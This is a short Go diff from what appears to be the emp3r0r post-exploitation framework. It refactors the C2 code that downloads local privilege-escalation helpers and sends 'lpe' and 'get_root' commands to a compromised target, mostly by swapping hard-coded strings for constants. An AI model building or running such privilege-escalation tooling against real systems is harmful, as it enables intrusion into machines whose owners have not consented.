@@ -1,6 +1,9 @@
 package cc
 
 import (
+	"fmt"
+
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 )
 
@@ -22,7 +25,7 @@ func moduleLPE() {
 
 		// download third-party LPE helper
 		CliPrintInfo("Updating local LPE helper...")
-		err := DownloadFile(LPEHelpers[helperName], Temp+tun.FileAPI+helperName)
+		err := DownloadFile(LPEHelpers[helperName], Temp+tun.WWW+helperName)
 		if err != nil {
 			CliPrintError("Failed to download %s: %v", helperName, err)
 			return
@@ -30,7 +33,7 @@ func moduleLPE() {
 
 		// exec
 		CliMsg("This can take some time, please be patient")
-		cmd := "!lpe " + helperName
+		cmd := fmt.Sprintf("%s %s", emp3r0r_data.C2CmdLPE, helperName)
 		CliPrintInfo("Running " + cmd)
 		err = SendCmd(cmd, "", target)
 		if err != nil {
@@ -40,7 +43,7 @@ func moduleLPE() {
 }
 
 func moduleGetRoot() {
-	err := SendCmd("!get_root", "", CurrentTarget)
+	err := SendCmdToCurrentTarget(emp3r0r_data.C2CmdGetRoot, "")
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
 		return
